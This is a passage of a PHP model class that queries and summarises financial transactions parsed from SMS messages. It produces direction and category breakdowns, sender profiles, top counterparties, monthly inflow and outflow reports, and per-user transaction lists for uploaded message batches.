        $transactionTypeBreakdown = $this->get_transaction_type_breakdown_for_loot($uuid);

        $summary = [
            'info_All'                => (int) ($counters['info_All'] ?? 0),
            'loot_Uuid'               => $uuid,
            'loot_Created'            => is_numeric($date) ? date('Y-m-d H:i:s', (int)$date) : $date,
            'direction_breakdown'     => json_encode($directionBreakdown),
            'transaction_type_breakdown' => json_encode($transactionTypeBreakdown),
            'user_id'                 => $userId,
        ];

        $ok = $this->db->table('tbl_Loot_Summary')->insert($summary);
        if (!$ok) {
            $error = $this->db->error();
            throw new \RuntimeException(
                'Failed to save loot summary: ' . ($error['message'] ?? 'unknown DB error')
            );
        }

        return true;
    }

    /**
     * Get direction breakdown for a specific loot (incoming/outgoing/none)
     */
    protected function get_direction_breakdown_for_loot(string $lootUuid): array {
        $rows = $this->db->table('tbl_Sms s')
            ->select('sc.direction')
            ->join('tbl_Sms_Classification sc', 'sc.sms_id = s.id', 'left')
            ->where('s.sms_loot_source', $lootUuid)
            ->get()
            ->getResult();

        $breakdown = ['Money In' => 0, 'Money Out' => 0, 'Unknown' => 0, 'Balance Inquiry' => 0];
        foreach ($rows as $row) {
            $dir = strtolower($row->direction ?? 'none');
            if ($dir === 'incoming' || $dir === 'received') {
                $breakdown['Money In']++;
            } elseif ($dir === 'outgoing' || $dir === 'sent') {
                $breakdown['Money Out']++;
            } elseif ($dir === 'balance' || $dir === 'balance_inquiry') {
                $breakdown['Balance Inquiry']++;
            } else {
                $breakdown['Unknown']++;
            }
        }
        return $breakdown;
    }

    /**
     * Get transaction type breakdown for a specific loot
     */
    protected function get_transaction_type_breakdown_for_loot(string $lootUuid): array {
        $rows = $this->db->table('tbl_Sms s')
            ->select('a.description as transaction_type')
            ->join('tbl_Analyzed_Transactions a', 'a.orig_sms_id = s.id', 'left')
            ->where('s.sms_loot_source', $lootUuid)
            ->get()
            ->getResult();

        $breakdown = [];
        foreach ($rows as $row) {
            $type = strtolower($row->transaction_type ?? 'unknown');
            if (!isset($breakdown[$type])) $breakdown[$type] = 0;
            $breakdown[$type]++;
        }
        return $breakdown;
    }

    /**
     * Get aggregated financial overview for a user/device
     */
    public function get_financial_overview(string $ownerUuid, string $deviceId): array {
        $default = [
            'total_transactions' => 0,
            'total_senders' => 0,
            'finance_senders' => 0,
            'category_breakdown' => [],
            'total_amount_sent' => 0.0,
            'total_amount_received' => 0.0,
            'period_start' => date('Y-m-d', strtotime('-30 days')),
            'period_end' => date('Y-m-d'),
        ];

        // Get all SMS with classifications for this user
        $smsBuilder = $this->db->table('tbl_Sms s')
            ->select('s.id, sc.category, sc.direction, sc.is_finance, a.amount')
            ->join('tbl_Sms_Classification sc', 'sc.sms_id = s.id', 'left')
            ->join('tbl_Analyzed_Transactions a', 'a.orig_sms_id = s.id', 'left')
            ->where('s.sms_owner', $ownerUuid);

        $rows = $smsBuilder->get()->getResult();
        if (empty($rows)) return $default;

        $total = count($rows);
        $senders = [];
        $financeSenders = [];
        $categoryBreakdown = [];
        $totalSent = 0.0;
        $totalReceived = 0.0;

        foreach ($rows as $row) {
            $cat = $row->category ?? 'Unclassified';
            if (!isset($categoryBreakdown[$cat])) $categoryBreakdown[$cat] = 0;
            $categoryBreakdown[$cat]++;

            if (!in_array($row->category, $senders)) {
                $senders[] = $row->category;
            }

            $dir = strtolower($row->direction ?? 'none');
            $amt = (float)($row->amount ?? 0);
            if ($dir === 'incoming' || $dir === 'received') {
                $totalReceived += $amt;
            } elseif ($dir === 'outgoing' || $dir === 'sent') {
                $totalSent += $amt;
            }

            if (!empty($row->is_finance)) {
                $financeSenders[] = $row->category;
            }
        }

        // Find earliest and latest SMS time
        $timeBuilder = $this->db->table('tbl_Sms s')
            ->select('MIN(s.sms_time) as first, MAX(s.sms_time) as last')
            ->where('s.sms_owner', $ownerUuid);
        $timeRow = $timeBuilder->get()->getRow();

        $periodStart = $timeRow->first ? $this->normalizeDate($timeRow->first) : $default['period_start'];
        $periodEnd = $timeRow->last ? $this->normalizeDate($timeRow->last) : $default['period_end'];

        return [
            'total_transactions' => $total,
            'total_senders' => count(array_unique($senders)),
            'finance_senders' => count(array_unique($financeSenders)),
            'category_breakdown' => $categoryBreakdown,
            'total_amount_sent' => round($totalSent, 2),
            'total_amount_received' => round($totalReceived, 2),
            'period_start' => substr($periodStart, 0, 10),
            'period_end' => substr($periodEnd, 0, 10),
        ];
    }

    /**
     * Get paginated transactions by financial category
     */
    public function get_transactions_by_category(
        string $ownerUuid,
        string $deviceId,
        string $category = '',
        int $page = 1,
        int $perPage = 50
    ): array {
        $builder = $this->db->table('tbl_Sms s')
            ->select('
                s.id, s.sms_body, s.sms_number, s.sms_time,
                a.amount, a.counterparty, a.description as transaction_type,
                a.trans_date, a.orig_sms_int_id,
                sc.category, sc.direction, sc.sender as sender_number,
                sp.sp_name as sender_name, sp.sp_confidence
            ')
            ->join('tbl_Sms_Classification sc', 'sc.sms_id = s.id', 'left')
            ->join('tbl_Analyzed_Transactions a', 'a.orig_sms_id = s.id', 'left')
            ->join('tbl_Sender_Profiles sp', 'sp.sp_number = sc.sender AND sp.sp_owner = s.sms_owner', 'left')
            ->where('s.sms_owner', $ownerUuid);

        if (!empty($category) && $category !== 'all') {
            $builder->where('sc.category', $category);
        }

        // Get total count
        $countBuilder = clone $builder;
        $total = $countBuilder->countAllResults();

        // Get paginated results
        $offset = ($page - 1) * $perPage;
        $rows = $builder->orderBy('s.sms_time', 'DESC')
            ->limit($perPage, $offset)
            ->get()
            ->getResult();

        $transactions = [];
        foreach ($rows as $row) {
            $body = '';
            try {
                $body = base64_decode($row->sms_body);
                if (mb_detect_encoding($body, 'UTF-8', true) === false) {
                    $body = $row->sms_body;
                }
            } catch (\Exception $e) {
                $body = $row->sms_body ?? '';
            }

            $transactions[] = [
                'id' => (int)$row->id,
                'sms_body' => mb_substr($body, 0, 500),
                'amount' => $row->amount ? (float)$row->amount : null,
                'direction' => $row->direction ?? 'none',
                'counterparty' => $row->counterparty,
                'category' => $row->category ?? 'Unclassified',
                'sender_name' => $row->sender_name ?? $row->sender_number ?? 'Unknown',
                'sender_number' => $row->sender_number ?? '',
                'transaction_type' => $row->transaction_type ?? 'unknown',
                'trans_date' => $row->trans_date,
                'balance' => null,
            ];
        }

        return [
            'transactions' => $transactions,
            'total' => $total,
            'page' => $page,
            'per_page' => $perPage,
        ];
    }

    /**
     * Get sender profiles with transaction counts
     */
    public function get_sender_profiles(string $ownerUuid, string $deviceId): array {
        $builder = $this->db->table('tbl_Sender_Profiles sp')
            ->select('
                sp.sp_number as number,
                sp.sp_name as name,
                sp.sp_category as category,
                sp.sp_is_finance as is_finance,
                sp.sp_confidence as confidence,
                COUNT(s.id) as transaction_count,
                SUM(a.amount) as total_amount
            ')
            ->join('tbl_Sms s', 's.sms_number = sp.sp_number AND s.sms_owner = sp.sp_owner', 'left')
            ->join('tbl_Analyzed_Transactions a', 'a.orig_sms_id = s.id', 'left')
            ->where('sp.sp_owner', $ownerUuid)
            ->groupBy('sp.sp_number')
            ->orderBy('transaction_count', 'DESC');

        $rows = $builder->get()->getResult();
        $profiles = [];

        foreach ($rows as $row) {
            $profiles[] = [
                'number' => $row->number,
                'name' => $row->name,
                'category' => $row->category ?? 'Unclassified',
                'is_finance' => (bool)$row->is_finance,
                'confidence' => (float)($row->confidence ?? 0),
                'transaction_count' => (int)($row->transaction_count ?? 0),
                'total_amount' => round((float)($row->total_amount ?? 0), 2),
            ];
        }

        return $profiles;
    }

    /**
     * Get top counterparties from analyzed data
     */
    public function getTopCounterparties(int $limit = 5, ?string $deviceToken = null): array {
        if (!$this->db->tableExists('tbl_Analyzed_Transactions')) return [];

        $builder = $this->db->table('tbl_Analyzed_Transactions a')
            ->select('a.counterparty, SUM(a.amount) as total_amount, COUNT(*) as trans_count')
            ->where('a.counterparty !=', 'Unknown')
            ->groupBy('a.counterparty')
            ->orderBy('total_amount', 'DESC')
            ->limit($limit);
            
        if ($deviceToken) {
            $builder->join('tbl_Sms s', 's.sms__id = a.orig_sms_id', 'left')
                    ->where('s.sms_owner', $deviceToken);
        }

        return $builder->get()->getResult();
    }

    /**
     * Get full report data for a given month/year
     */
    public function getReportData(int $year, int $month): array {
        $daysInMonth  = date('t', mktime(0, 0, 0, $month, 1, $year));
        $monthStr     = sprintf('%04d-%02d', $year, $month);

        $labels   = [];
        $inflow   = [];
        $outflow  = [];

        // Build daily data
        $allSms = $this->db->table('tbl_Sms s')
            ->select('s.*, sc.direction as cl_direction')
            ->join('tbl_Sms_Classification sc', 'sc.sms_id = s.id', 'left')
            ->get()->getResult();

        // Index SMS by date
        $byDate = [];
        foreach ($allSms as $sms) {
            $normalized = $this->normalizeDate($sms->sms_time);
            $dateKey    = substr($normalized, 0, 10); // YYYY-MM-DD
            if (substr($dateKey, 0, 7) !== $monthStr) continue;
            $byDate[$dateKey][] = $sms;
        }

        for ($d = 1; $d <= $daysInMonth; $d++) {
            $dateKey    = sprintf('%04d-%02d-%02d', $year, $month, $d);
            $labels[]   = date('d', strtotime($dateKey));
            $dayIn      = 0;
            $dayOut     = 0;

            foreach ($byDate[$dateKey] ?? [] as $sms) {
                $body   = strtolower(base64_decode($sms->sms_body));
                $amount = $this->extractAmount($body);
                $dir    = strtolower($sms->cl_direction ?? '');
                if ($dir === 'incoming') $dayIn += $amount;
                elseif ($dir === 'outgoing') $dayOut += $amount;
            }

            $inflow[]  = $dayIn;
            $outflow[] = $dayOut;
        }

        // Totals
        $totalIn  = array_sum($inflow);
        $totalOut = array_sum($outflow);
        $net      = $totalIn - $totalOut;

        // Category breakdown (all SMS in this month)
        $categories = ['Received' => 0, 'Sent' => 0, 'Withdraw' => 0, 'Fuliza' => 0, 'Other' => 0];
        foreach ($byDate as $rows) {
            foreach ($rows as $sms) {
                $body   = strtolower(base64_decode($sms->sms_body));
                $amount = $this->extractAmount($body);
                $dir    = strtolower($sms->cl_direction ?? '');
                if ($dir === 'incoming') $categories['Received'] += $amount;
                elseif ($dir === 'outgoing') $categories['Sent'] += $amount;
                else $categories['Other'] += $amount;

                if (strpos($body, 'fuliza') !== false && strpos($body, 'taken') !== false) {
                    $categories['Fuliza'] += $amount;
                }
            }
        }

        // Top counterparties this month (from analyzed or raw)
        $topCounterparties = [];
        if ($this->db->tableExists('tbl_Analyzed_Transactions')) {
            $rows = $this->db->table('tbl_Analyzed_Transactions')
                ->select('counterparty, SUM(amount) as total_amount, COUNT(*) as trans_count')
                ->where("DATE_FORMAT(trans_date, '%Y-%m')", $monthStr)
                ->where('counterparty !=', 'Unknown')
                ->groupBy('counterparty')
                ->orderBy('total_amount', 'DESC')
                ->limit(5)
                ->get()->getResult();
            $topCounterparties = $rows;
        }

        // Transaction count
        $txCount = 0;
        foreach ($byDate as $rows) $txCount += count($rows);

        return [
            'year'              => $year,
            'month'             => $month,
            'month_name'        => date('F', mktime(0, 0, 0, $month, 1, $year)),
            'labels'            => $labels,
            'inflow'            => $inflow,
            'outflow'           => $outflow,
            'total_in'          => $totalIn,
            'total_out'         => $totalOut,
            'net'               => $net,
            'categories'        => $categories,
            'top_counterparties'=> $topCounterparties,
            'tx_count'          => $txCount,
        ];
    }

    /**
     * Get category breakdown for a specific upload batch
     * Returns counts per financial category from classifications
     */
    public function get_upload_category_breakdown(string $lootUuid): array {
        $rows = $this->db->query("
            SELECT COALESCE(latest.cat, 'Unclassified') as category, COUNT(*) as count
            FROM tbl_Sms s
            LEFT JOIN (
                SELECT sc1.sms_id, sc1.category as cat
                FROM tbl_Sms_Classification sc1
                INNER JOIN (
                    SELECT sms_id, MAX(created_at) as max_created
                    FROM tbl_Sms_Classification
                    GROUP BY sms_id
                ) sc2 ON sc1.sms_id = sc2.sms_id AND sc1.created_at = sc2.max_created
            ) latest ON latest.sms_id = s.id
            WHERE s.sms_loot_source = ?
            GROUP BY category
            ORDER BY count DESC
        ", [$lootUuid])->getResult();

        $breakdown = [];
        foreach ($rows as $row) {
            $breakdown[$row->category] = (int)$row->count;
        }
        return $breakdown;
    }

    /**
     * Get financial summary for a specific upload batch
     */
    public function get_upload_financial_summary(string $lootUuid): array {
        $row = $this->db->query("
            SELECT
                COALESCE(SUM(a.amount), 0) as total_amount,
                COUNT(DISTINCT a.counterparty) as counterparties,
                COUNT(a.id) as analyzed_count
            FROM tbl_Analyzed_Transactions a
            INNER JOIN tbl_Sms s ON s.id = a.orig_sms_int_id OR s.sms__id = a.orig_sms_id
            WHERE s.sms_loot_source = ?
        ", [$lootUuid])->getRow();

        return [
            'total_amount' => (float)($row->total_amount ?? 0),
            'counterparties' => (int)($row->counterparties ?? 0),
            'analyzed_count' => (int)($row->analyzed_count ?? 0),
        ];
    }

    /**
     * Get direction breakdown for a specific upload batch
     * Returns counts by LLM direction: incoming (Money In), outgoing (Money Out), none (Unknown)
     */
    public function get_upload_direction_breakdown(string $lootUuid): array {
        $rows = $this->db->query("
            SELECT 
                CASE 
                    WHEN LOWER(COALESCE(latest.direction, 'none')) IN ('incoming', 'received') THEN 'Money In'
                    WHEN LOWER(COALESCE(latest.direction, 'none')) IN ('outgoing', 'sent') THEN 'Money Out'
                    WHEN LOWER(COALESCE(latest.direction, 'none')) IN ('balance', 'balance_inquiry') THEN 'Balance Inquiry'
                    ELSE 'Unknown'
                END as direction_label,
                COUNT(*) as count
            FROM tbl_Sms s
            LEFT JOIN (
                SELECT sc1.sms_id, sc1.direction
                FROM tbl_Sms_Classification sc1
                INNER JOIN (
                    SELECT sms_id, MAX(created_at) as max_created
                    FROM tbl_Sms_Classification
                    GROUP BY sms_id
                ) sc2 ON sc1.sms_id = sc2.sms_id AND sc1.created_at = sc2.max_created
            ) latest ON latest.sms_id = s.id
            WHERE s.sms_loot_source = ?
            GROUP BY direction_label
            ORDER BY count DESC
        ", [$lootUuid])->getResult();

        $breakdown = [];
        foreach ($rows as $row) {
            $breakdown[$row->direction_label] = (int)$row->count;
        }
        return $breakdown;
    }

    /**
     * Get transaction type breakdown for a specific upload batch
     * Returns counts by LLM transaction_type from analyzed transactions
     */
    public function get_upload_transaction_type_breakdown(string $lootUuid): array {
        $rows = $this->db->query("
            SELECT COALESCE(a.description, 'unknown') as transaction_type, COUNT(*) as count
            FROM tbl_Analyzed_Transactions a
            INNER JOIN tbl_Sms s ON s.id = a.orig_sms_int_id OR s.sms__id = a.orig_sms_id
            WHERE s.sms_loot_source = ?
            GROUP BY transaction_type
            ORDER BY count DESC
        ", [$lootUuid])->getResult();

        $breakdown = [];
        foreach ($rows as $row) {
            $breakdown[$row->transaction_type] = (int)$row->count;
        }
        return $breakdown;
    }

    public function getAllTransactionsForUser(int $userId): array
    {
        $tokenType = \CodeIgniter\Shield\Authentication\Authenticators\AccessTokens::ID_TYPE_ACCESS_TOKEN;

        $rawTokens = [];
        $tokenRows = $this->db->query("
            SELECT DISTINCT s.sms_owner AS tk FROM tbl_Sms s
            INNER JOIN auth_identities i ON i.secret = SHA2(s.sms_owner, 256)
            WHERE i.user_id = ? AND i.type = ?
            UNION
            SELECT DISTINCT l.loot_Owner AS tk FROM tbl_Loot l
            INNER JOIN auth_identities i ON i.secret = SHA2(l.loot_Owner, 256)
            WHERE i.user_id = ? AND i.type = ?
        ", [$userId, $tokenType, $userId, $tokenType])->getResult();

        foreach ($tokenRows as $r) {
            if (!empty($r->tk)) $rawTokens[] = $r->tk;
        }

        if (empty($rawTokens)) return [];

        $rows = $this->db->table('tbl_Sms s')
            ->select('
                s.sms_time, s.sms_body, s.sms_number,
                s.sms_amount, s.sms_balance, s.sms_counterparty,
                s.sms_direction, s.sms_transaction_type,
                sc.category, sc.direction as classified_direction,
                a.amount, a.counterparty as analyzed_counterparty,
                a.description, a.trans_date
            ')
            ->join('tbl_Sms_Classification sc', 'sc.sms_id = s.id', 'left')
            ->join('tbl_Analyzed_Transactions a', 'a.orig_sms_id = s.id', 'left')
            ->whereIn('s.sms_owner', $rawTokens)
            ->orderBy('s.sms_time', 'DESC')
            ->get()
            ->getResultArray();

        return $rows;
    }
}
